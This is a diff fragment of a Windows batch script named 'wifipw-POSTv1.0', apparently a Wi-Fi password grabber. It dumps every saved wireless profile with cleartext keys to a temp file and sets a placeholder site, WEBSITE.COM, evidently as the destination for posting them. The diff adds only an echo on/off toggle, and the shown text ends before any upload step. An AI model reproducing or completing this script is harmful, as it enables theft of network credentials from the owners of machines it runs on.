@@ -1,7 +1,21 @@
 @echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
 netsh wlan show profile * key=clear>>%tmp%\wifi.url
 set "website=WEBSITE.COM"
+set "echoquestion=off"
+if %echoquestion% == off goto off
+if %echoquestion% == on goto on
+:off
+@echo off
+goto setlines
+:on
+@echo on
+goto setlines
+echo error!
+set /p "end="
+exit
 
+
+:setlines
 (
 set /p line1=
 set /p line2=
